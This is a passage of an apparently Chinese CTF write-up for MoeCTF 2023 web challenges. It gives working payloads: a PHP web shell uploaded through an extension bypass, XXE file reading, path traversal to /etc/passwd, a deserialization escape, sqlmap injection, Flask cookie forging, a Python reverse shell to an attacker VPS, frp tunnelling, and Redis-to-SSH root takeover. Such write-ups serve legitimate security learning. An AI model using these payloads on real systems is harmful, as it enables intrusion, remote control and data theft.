href="#meo%E5%9B%BE%E5%BA%8A"><span class="toc-text">meo图床</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E5%91%BD%E5%8D%81%E4%B8%89%E6%9E%AA"><span class="toc-text">夺命十三枪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signin"><span class="toc-text">signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E5%8E%BB%E6%97%85%E6%B8%B8%E7%9A%84%E5%BF%83%E6%B5%B7"><span class="toc-text">出去旅游的心海</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#moeworld"><span class="toc-text">moeworld</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">Misc 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%871"><span class="toc-text">打不开的图片1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E5%9B%BE%E7%89%872"><span class="toc-text">打不开的图片2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%97%E5%AD%90-1-%E6%99%AE%E9%80%9A%E7%9A%84%E7%8C%AB"><span class="toc-text">狗子(1) 普通的猫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#building-near-lake"><span class="toc-text">building_near_lake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8A%E5%98%9F%E5%81%87%E5%98%9F%EF%BC%9F"><span class="toc-text">尊嘟假嘟？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AB%E7%83%AB%E7%83%AB"><span class="toc-text">烫烫烫</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">Crypto 入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-e"><span class="toc-text">baby_e</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail"><span class="toc-text">Jail</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-0"><span class="toc-text">Jail Level 0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-1"><span class="toc-text">Jail Level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-2"><span class="toc-text">Jail Level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jail-Level-4"><span class="toc-text">Jail Level 4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E8%BA%AB%E6%90%BA%E5%B8%A6%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-text">随身携带的虚拟机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AI"><span class="toc-text">AI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AI%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-text">AI入门指北</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-MLP"><span class="toc-text">EZ MLP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ABC"><span class="toc-text">ABC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CLASSIAL-CRYPTO"><span class="toc-text">CLASSIAL CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrot"><span class="toc-text">ezrot</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%8F%AF%E7%9A%84%E6%96%B0%E5%9B%B4%E5%A2%99"><span class="toc-text">可可的新围墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9A%87%E5%B8%9D%E7%9A%84%E6%96%B0%E5%AF%86%E7%A0%81"><span class="toc-text">皇帝的新密码</span></a></li></ol></li></ol></div></p>
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916123003522.png" alt="image-20230916123003522"></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><pre><code>POST /?UwU=u HTTP/1.1
+User-Agent: MoeBrowser
+X-Forwarded-For: 127.0.0.1
+Cookie:  character=admin
+
+Luv=u
+</code></pre>
+<p>发包后获得flag</p>
+<pre><code>moectf&#123;basic_http_knowledge_LPwyWX2LPpyLWy40PCZuQd7uM2L8xy6F&#125;
+</code></pre>
+<h3 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h3><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916114945180.png" alt="image-20230916114945180"></p>
+<h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p>F12全局审查元素搜索关键字<code>moectf</code>,成功发现在注释里藏着的flag</p>
+<pre><code>&lt;!--经过tracker，破获出内容为moectf&#123;find_comments_n_3NAn_aCQKzEvnk6R94YzZWEL_4ZRGh&#125;--&gt;
+</code></pre>
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>根据<code>README.md</code>给出的api注册登录获取flag</p>
+<pre><code>POST /register
+
+
+&#123;
+    &quot;username&quot;:&quot;ttycp3&quot;,
+    &quot;password&quot;:&quot;123456&quot;
+&#125;
+----------------------------------------------------------------------------
+POST /login
+
+&#123;
+    &quot;username&quot;:&quot;ttycp3&quot;,
+    &quot;password&quot;:&quot;123456&quot;
+&#125;
+----------------------------------------------------------------------------
+GET /flag
+</code></pre>
+<p>给了个假flag告诉我不是<code>admin</code>，尝试对token进行base64解码</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916125840022.png" alt="image-20230916125840022"></p>
+<p>把<code>username</code>,<code>password</code>,<code>role</code>全改成admin再进行base64编码（不知道验证的哪个都改了算了）</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916130032150.png" alt="image-20230916130032150"></p>
+<p>重新获取flag</p>
+<pre><code>GET /flag
+token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0=
+</code></pre>
+<p>拿到flag</p>
+<pre><code>moectf&#123;cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro&#125;
+</code></pre>
+<h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>写个脚本漂移一下</p>
+<pre><code class="python">import requests
+import re
+session=requests.session()
+url=&quot;http://localhost:59398&quot;
+data=&#123;
+    &quot;driver&quot;:&quot;ttycp3&quot;,
+    &quot;steering_control&quot;:&#39;0&#39;,
+    &quot;throttle&quot;:&#39;2&#39;
+&#125;
+for i in range(7):
+    s=session.post(url=url,data=data)
+    if &quot;moectf&quot; in s.text:
+        print(s.text)
+        break
+    att=re.findall(&quot;&lt;font color=\&quot;red\&quot;&gt;([\u4e00-\u9fa5！，]+)&quot;,s.text)
+    print(att)
+    if &quot;直行&quot; in att[0]:
+        data[&quot;steering_control&quot;]=&#39;0&#39;
+    elif &quot;左&quot; in att[0]:
+        data[&quot;steering_control&quot;]=&#39;1&#39;
+        print(data)
+    elif &quot;右&quot; in att[0]:
+        data[&quot;steering_control&quot;]=&#39;-1&#39;
+    if &quot;保持&quot; in att[0]:
+        data[&quot;throttle&quot;]=&#39;1&#39;
+    elif &quot;大&quot; in att[0]:
+        data[&quot;throttle&quot;]=&#39;2&#39;
+    elif &quot;小&quot; in att[0]:
+        data[&quot;throttle&quot;]=&#39;0&#39;
+</code></pre>
+<pre><code>这是你的奖励！ moectf&#123;Beautiful_Drifting!!_N-CA8l6SspV7Hyel7AQolMnoT1I3w9Lc&#125;
+</code></pre>
+<h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p>经过简单的上传测试后只能上传png文件，尝试利用<code>.htaccess</code>也上传不上去，意外发现<code>upload.php</code>源码可以读：</p>
+<pre><code class="php">&lt;?php
+$targetDir = &#39;uploads/&#39;;
+$allowedExtensions = [&#39;png&#39;];
+
+
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_FILES[&#39;file&#39;])) &#123;
+    $file = $_FILES[&#39;file&#39;];
+    $tmp_path = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
+
+    if ($file[&#39;type&#39;] !== &#39;image/png&#39;) &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件类型不符合要求&#39;]));
+    &#125;
+
+    if (filesize($tmp_path) &gt; 512 * 1024) &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件太大&#39;]));
+    &#125;
+
+    $fileName = $file[&#39;name&#39;];
+    $fileNameParts = explode(&#39;.&#39;, $fileName);
+
+    if (count($fileNameParts) &gt;= 2) &#123;
+        $secondSegment = $fileNameParts[1];
+        if ($secondSegment !== &#39;png&#39;) &#123;
+            die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+        &#125;
+    &#125; else &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+    &#125;
+
+    $uploadFilePath = dirname(__FILE__) . &#39;/&#39; . $targetDir . basename($file[&#39;name&#39;]);
+
+    if (move_uploaded_file($tmp_path, $uploadFilePath)) &#123;
+        die(json_encode([&#39;success&#39; =&gt; true, &#39;file_path&#39; =&gt; $uploadFilePath]));
+    &#125; else &#123;
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件上传失败&#39;]));
+    &#125;
+&#125;
+else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
+<p>发现他只对文件名第一个点后面的内容做检测，所以我们可以让文件名为<code>1.png.php</code>来上传一个一句话木马</p>
+<p>首先构造一个名为<code>1.png</code>的文件内容为</p>
+<pre><code>GIF89a&lt;?php eval($_POST[1]);
+</code></pre>
+<p>用burpsuite抓包上传，把文件名修改为<code>1.png.php</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916160051613.png" alt="image-20230916160051613"></p>
+<p>上传成功，然后直接上蚁剑上菜刀或者手动getshell姿势随意</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916160222059.png" alt="image-20230916160222059"></p>
+<h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><p>题目说flag在根目录，观察一下其他车图片获得的途径都是通过post传递一个xml信息来读取，很容易想到这里考的是XXE漏洞，对payload进行url编码后POST拿到flag，下面是payload:</p>
+<pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY&gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;
+&lt;xml&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/xml&gt;
+</code></pre>
+<p>发包：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916161529187.png" alt="image-20230916161529187"></p>
+<h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><p>用burpsuite的<code>Intruder</code>模块进行爆破，在长度明显与别的有很大差别的163中找到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916162301801.png" alt="image-20230916162301801"></p>
+<h3 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h3><p>还是一个文件上传，不过这回upload.php没法读了，但好像没有对后缀有任何限制还给出了文件路径，访问后发现一片白，尝试构造报错发现有一个file_get_contents()函数。</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916170507967.png" alt="image-20230916170507967"></p>
+<p>正常访问这个文件会提示404，尝试看看能不能利用images.php页面的file_get_contents()来读取根目录的文件，尝试payload<code>images.php?name=../../../../../etc/passwd</code>，访问后并没有提示404而是有一个图片格式的样式，下载下来用记事本打开就可以看见文件内容，尝试读取<code>/flag</code>,获得内容</p>
+<pre><code class="txt">hello~
+Flag Not Here~
+Find Somewhere Else~
+
+
+&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;
+
+Not Here~~~~~~~~~~~~~ awa
+</code></pre>
+<p>读取<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code>内容：</p>
+<pre><code class="php">&lt;?php
+
+highlight_file(__FILE__);
+
+if (isset($_GET[&#39;param1&#39;]) &amp;&amp; isset($_GET[&#39;param2&#39;])) &#123;
+    $param1 = $_GET[&#39;param1&#39;];
+    $param2 = $_GET[&#39;param2&#39;];
+
+    if ($param1 !== $param2) &#123;
+        
+        $md5Param1 = md5($param1);
+        $md5Param2 = md5($param2);
+
+        if ($md5Param1 == $md5Param2) &#123;
+            echo &quot;O.O!! &quot; . getenv(&quot;FLAG&quot;);
+        &#125; else &#123;
+            echo &quot;O.o??&quot;;
+        &#125;
+    &#125; else &#123;
+        echo &quot;o.O?&quot;;
+    &#125;
+&#125; else &#123;
+    echo &quot;O.o?&quot;;
+&#125;
+
+?&gt; O.o?
+</code></pre>
+<p>经典md5若比较，数组绕过秒了</p>
+<pre><code>GET /Fl3g_n0t_Here_dont_peek!!!!!.php?param1[]=1&amp;param2[]=2
+</code></pre>
+<p>获得flag</p>
+<pre><code>moectf&#123;oops_file_get_contents_controllable_gps_Lg6qE0PRs7vOoLfQqhTFBi_-NpSS&#125;
+</code></pre>
+<h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><p>index.php</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+
+require_once(&#39;Hanxin.exe.php&#39;);
+
+$Chant = isset($_GET[&#39;chant&#39;]) ? $_GET[&#39;chant&#39;] : &#39;夺命十三枪&#39;;
+
+$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);
+
+$before = serialize($new_visitor);
+$after = Deadly_Thirteen_Spears::Make_a_Move($before);
+echo &#39;Your Movements: &#39; . $after . &#39;&lt;br&gt;&#39;;
+
+try&#123;
+    echo unserialize($after);
+&#125;catch (Exception $e) &#123;
+    echo &quot;Even Caused A Glitch...&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>Hanxin.exe.php</p>
+<pre><code class="php">&lt;?php
+
+if (basename($_SERVER[&#39;SCRIPT_FILENAME&#39;]) === basename(__FILE__)) &#123;
+    highlight_file(__FILE__);
+&#125;
+
+class Deadly_Thirteen_Spears&#123;
+    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
+        &quot;di_yi_qiang&quot; =&gt; &quot;Lovesickness&quot;,
+        &quot;di_er_qiang&quot; =&gt; &quot;Heartbreak&quot;,
+        &quot;di_san_qiang&quot; =&gt; &quot;Blind_Dragon&quot;,
+        &quot;di_si_qiang&quot; =&gt; &quot;Romantic_charm&quot;,
+        &quot;di_wu_qiang&quot; =&gt; &quot;Peerless&quot;,
+        &quot;di_liu_qiang&quot; =&gt; &quot;White_Dragon&quot;,
+        &quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,
+        &quot;di_ba_qiang&quot; =&gt; &quot;Kunpeng&quot;,
+        &quot;di_jiu_qiang&quot; =&gt; &quot;Night_Parade_of_a_Hundred_Ghosts&quot;,
+        &quot;di_shi_qiang&quot; =&gt; &quot;Overlord&quot;,
+        &quot;di_shi_yi_qiang&quot; =&gt; &quot;Letting_Go&quot;,
+        &quot;di_shi_er_qiang&quot; =&gt; &quot;Decisive_Victory&quot;,
+        &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;
+    );
+
+    public static function Make_a_Move($move)&#123;
+        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement)&#123;
+            $move = str_replace($index, $movement, $move);
+        &#125;
+        return $move;
+    &#125;
+&#125;
+
+class Omg_It_Is_So_Cool_Bring_Me_My_Flag&#123;
+
+    public $Chant = &#39;&#39;;
+    public $Spear_Owner = &#39;Nobody&#39;;
+
+    function __construct($chant)&#123;
+        $this-&gt;Chant = $chant;
+        $this-&gt;Spear_Owner = &#39;Nobody&#39;;
+    &#125;
+
+    function __toString()&#123;
+        if($this-&gt;Spear_Owner !== &#39;MaoLei&#39;)&#123;
+            return &#39;Far away from COOL...&#39;;
+        &#125;
+        else&#123;
+            return &quot;Omg You&#39;re So COOOOOL!!! &quot; . getenv(&#39;FLAG&#39;);
+        &#125;
+    &#125;
+&#125;
+
+?&gt;
+</code></pre>
+<p>考点字符串逃逸，我们需逃逸出<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>共计35个字符，我们可以选择<code>&quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;</code>一次逃逸5个字符，复制7遍即可，完整payload：</p>
+<pre><code>GET /?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230917020004911.png" alt="image-20230917020004911"></p>
+<h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>考到了代码审计的能力，这里我们慢慢分析。首先观察能够获取flag的条件：</p>
+<pre><code>def do_POST(self):
+        try:
+            if self.path == &quot;/login&quot;:
+                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))
+                payload = json.loads(body)
+                params = json.loads(decrypt(payload[&quot;params&quot;]))
+                print(params)
+                if params.get(&quot;username&quot;) == &quot;admin&quot;:
+                    self.send_response(403)
+                    self.end_headers()
+                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)
+                    print(&quot;admin&quot;)
+                    return
+                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):
+                    self.send_response(403)
+                    self.end_headers()
+                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)
+                    print(&quot;same&quot;)
+                    return
+                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))
+                for k,v in hashed_users.items():
+                    if hashed == v:
+                        data = &#123;
+                            &quot;user&quot;:k,
+                            &quot;hash&quot;:hashed,
+                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;
+                        &#125;
+</code></pre>
+<p>分析一下，代码要求我们传入的<code>username</code>不等于<code>admin</code>，且<code>username</code>和<code>password</code>不能相等，当<code>hashed</code>和<code>v</code>的值相等，且<code>k</code>为<code>admin</code>时，获得flag。观察一下<code>gethash</code>函数:</p>
+<pre><code>def gethash(*items):
+    c = 0
+    for item in items:
+        if item is None:
+            continue
+        c ^= int.from_bytes(hashlib.md5(f&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?
+    return hex(c)[2:]
+</code></pre>
+<p>可以看出他的作用是对传入的元素返回他们加盐哈希后异或的值,再观察一下<code>hashed_users</code>中的值是如何生成的：</p>
+<pre><code>hashed_users = dict((k,gethash(k,v)) for k,v in users.items())
+</code></pre>
+<p>可见他的值与users的值有关系，观察一下users的值：</p>
+<pre><code>assert &quot;admin&quot; in users
+assert users[&quot;admin&quot;] == &quot;admin&quot;
+</code></pre>
+<p>有两个断言，所以我们就可以推出users的值为<code>&#123;&quot;admin&quot;:&quot;admin&quot;&#125;</code>,既然users已知了，那我们的hashed_users也可以求出，根据异或的特性两个相同的值进行异或结果为零，那么hasded_users的值就为<code>&#123;&quot;admin&quot;:0&#125;</code>,回看拿到flag的条件中，k的值就为<code>admin</code>，v的值为<code>0</code>,所以我们只需要让<code>hashed</code>等于0即可。前面我们也提到了只有两个相同的值异或才为0，但又限制我们<code>username</code>和<code>password</code>不能相等，怎么办呢？我们可以利用字符和数字进行绕过，例如我们传入<code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:1&#125; </code>，二者类型不同所以不相等，但进行加盐哈希处理时会把数字当作字符串来处理，因此二者的<code>gethash</code>值为0，从而满足题目条件。</p>
+<pre><code>def decrypt(data:str):
+        for x in range(5):
+            data = base64.b64encode(data).decode() # ummm...? It looks like it&#39;s just base64 encoding it 5 times? truely?
+        return data
+</code></pre>
+<p>题目对传入的数据进行了五次base64解码，所以我们就将<code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:1&#125;</code>加密五次后传入即可获得flag</p>
+<h3 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h3><p>利用<code>burpsuite</code>抓包发现有一个<code>./wordpress/wp-content/plugins/visitor-logging/logger.php</code>文件，访问该页面发现源码：</p>
+<pre><code class="php">&lt;?php
+/*
+Plugin Name: Visitor auto recorder
+Description: Automatically record visitor&#39;s identification, still in development, do not use in industry environment!
+Author: KoKoMi
+  Still in development! :)
+*/
+
+// 不许偷看！这些代码我还在调试呢！
+highlight_file(__FILE__);
+
+// 加载数据库配置，暂时用硬编码绝对路径
+require_once(&#39;/var/www/html/wordpress/&#39; . &#39;wp-config.php&#39;);
+
+$db_user = DB_USER; // 数据库用户名
+$db_password = DB_PASSWORD; // 数据库密码
+$db_name = DB_NAME; // 数据库名称
+$db_host = DB_HOST; // 数据库主机
+
+// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
+// 这些是临时的代码
+
+$ip = $_POST[&#39;ip&#39;];
+$user_agent = $_POST[&#39;user_agent&#39;];
+$time = stripslashes($_POST[&#39;time&#39;]);
+
+$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+
+// 检查连接是否成功
+if ($mysqli-&gt;connect_errno) &#123;
+    echo &#39;数据库连接失败: &#39; . $mysqli-&gt;connect_error;
+    exit();
+&#125;
+
+$query = &quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#39;$ip&#39;, &#39;$user_agent&#39;, $time)&quot;;
+
+// 执行插入
+$result = mysqli_query($mysqli, $query);
+
+// 检查插入是否成功
+if ($result) &#123;
+    echo &#39;数据插入成功&#39;;
+&#125; else &#123;
+    echo &#39;数据插入失败: &#39; . mysqli_error($mysqli);
+&#125;
+
+// 关闭数据库连接
+mysqli_close($mysqli);
+</code></pre>
+<p>很明显可以sql注入，手注没注出来，用sqlmap出了，手注出来的师傅可以踢我一下看看payload</p>
+<pre><code>sqlmap -u &quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot; --data &quot;ip=1&amp;user_agent=2&amp;time=123&quot; #爆库爆表
+</code></pre>
+<h3 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h3><p>第一次做渗透题，边学边做学到很多。先随便注册个号登录，主页发现有提示secret_key的生成方法，写个python脚本爆破一下：</p>
+<pre><code class="python">import ast
+import os
+from flask.sessions import SecureCookieSessionInterface
+#核心加密解密内容可从flask_session_cookie_manager3.py中复制粘贴过来
+class MockApp(object):
+    def __init__(self, secret_key):
+        self.secret_key = secret_key
+class FSCM():
+    def decode(session_cookie_value, secret_key=None):
+        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
+        try:
+            if (secret_key == None):
+                compressed = False
+                payload = session_cookie_value
+
+                if payload.startswith(&#39;.&#39;):
+                    compressed = True
+                    payload = payload[1:]
+
+                data = payload.split(&quot;.&quot;)[0]
+
+                data = base64_decode(data)
+                if compressed:
+                    data = zlib.decompress(data)
+
+                return data
+            else:
+                app = MockApp(secret_key)
+
+                si = SecureCookieSessionInterface()
+                s = si.get_signing_serializer(app)
+
+                return s.loads(session_cookie_value)
+        except Exception as e:
+            return &quot;[Decoding error] &#123;&#125;&quot;.format(e)
+            raise e
+if __name__==&quot;__main__&quot;:
+    while(True):
+        secret_key=&quot;This-random-secretKey-you-can&#39;t-get&quot; + os.urandom(2).hex()
+        cookie=&quot;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6InR0eWNwMyJ9.ZRu0Eg.DIaxwqzA0edR6sEOY02RbrWzQ5w&quot;
+        if &quot;power&quot; not in FSCM.decode(cookie,secret_key):
+            print(FSCM.decode(cookie,secret_key),&quot;no&quot;)
+        else:
+            print(secret_key,&quot;yes&quot;)
+            break
+</code></pre>
+<p>成功爆破出secret_key</p>
+<pre><code>This-random-secretKey-you-can&#39;t-get8b3e
+</code></pre>
+<p>然后将<code>&#123;&#39;power&#39;:&#39;admin&#39;,&#39;user&#39;:&#39;ttycp3&#39;&#125;</code>用secret_key加密替换cookie，发现主页多出来个PIN码，访问<code>/console</code>路由输入PIN码，在自己的vps开启监听，输入反弹shell命令：</p>
+<pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)
+</code></pre>
+<p>反弹成功后在根目录拿到第一段flag</p>
+<pre><code>moectf&#123;Information-leakage-Is-dangerous!
+</code></pre>
+<p>根据提示我们用fscan扫描内网段，查看<code>/etc/hosts</code>文件发现有两个ip，那就扫描这个网段的端口</p>
+<pre><code>./fscan -h 172.20.1.1/16
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231003231204453.png" alt="image-20231003231204453"></p>
+<p>知道<code>hint.zip</code>密码为<code>22-3306-6379-8080</code>,根据hint的提示，我们知道要利用frp工具进行内网穿透拿到mysql服务器和redis服务器上的flag。靶机提供的frpc.ini权限不足无法修改，我们在<code>/tmp</code>目录自己写一个frpc.ini:</p>
+<pre><code>[common]
+server_addr = your-vps-ip
+server_port = 7002
+
+[mysql]
+type = tcp
+local_ip = 172.20.0.3
+local_port = 3306
+remote_port = 3309
+
+[redis]
+type = tcp
+local_ip = 172.20.0.2
+local_port = 6379
+remote_port = 6380
+[ssh]
+type = tcp
+local_ip = 172.20.0.2
+local_port = 22
+remote_port =30
+</code></pre>
+<p>在自己的vps上修改frps.ini:</p>
+<pre><code>[common]
+bind_port = 7002
+</code></pre>
+<p>分别运行<code>/app/tools/frpc -c frpc.ini</code>和<code>./frps -c frps.ini</code>,成功实现内网穿透。在靶机目录下可以看到mysql的用户名密码以及数据库：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231003232150197.png" alt="image-20231003232150197"></p>
+<p>在自己vps上连接数据库：</p>
+<pre><code>mysql -h 127.0.0.1 -P 3309 -u root -p messageboard
+</code></pre>
+<p>拿到第二段flag：</p>
+<pre><code>-Are-YOu-myS0L-MasT3r?-
+</code></pre>
+<p>利用redis未授权写入ssh公钥登录,分别执行以下命令，<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46576302/article/details/126766457">参考资料</a>：</p>
+<pre><code>1.在攻击机上创建ssh密钥对
+
+ssh-keygen
+
+2.创建1.txt，把攻击机的公钥写入1.txt,并传入目标redis服务的缓存
+
+(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt 
+
+cat 1.txt | redis-cli -h 127.0.0.1 -p 6380
+
+3.修改redis的配置
+
+redis-cli -h 127.0.0.1 -p 6380
+
+config set dir /root/.ssh
+
+conifg set dbfilename authorized_keys 
+
+save
+
+quit
+
+4.ssh免密登录
+
+ssh -i id_rsa -p 30 root@127.0.0.1
+</code></pre>
+<p>根目录拿到第三段flag:</p>
+<pre><code>P@sSW0Rd-F0r-redis-Is-NeceSsary&#125;
+</code></pre>
+<p>完整flag：</p>
+<pre><code>moectf&#123;Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary&#125;
+</code></pre>
+<p>参考师傅的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/amojie/p/17722570.html#5215995">博客</a></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Misc-入门指北"><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a>Misc 入门指北</h3><p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230916130959341.png" alt="image-20230916130959341"></p>
